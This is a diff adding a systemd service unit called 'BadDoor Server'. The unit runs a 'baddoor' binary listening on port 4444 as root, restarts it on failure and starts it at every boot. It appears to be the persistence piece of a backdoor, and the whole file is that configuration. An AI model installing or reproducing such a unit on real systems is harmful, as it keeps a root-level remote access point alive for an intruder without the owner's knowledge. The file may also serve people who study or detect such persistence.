@@ -1,0 +1,12 @@
+[Unit]
+Description=BadDoor Server
+After=network.target
+
+[Service]
+ExecStart=/usr/local/bin/baddoor -p 4444
+Restart=on-failure
+User=root
+Group=root
+
+[Install]
+WantedBy=multi-user.target
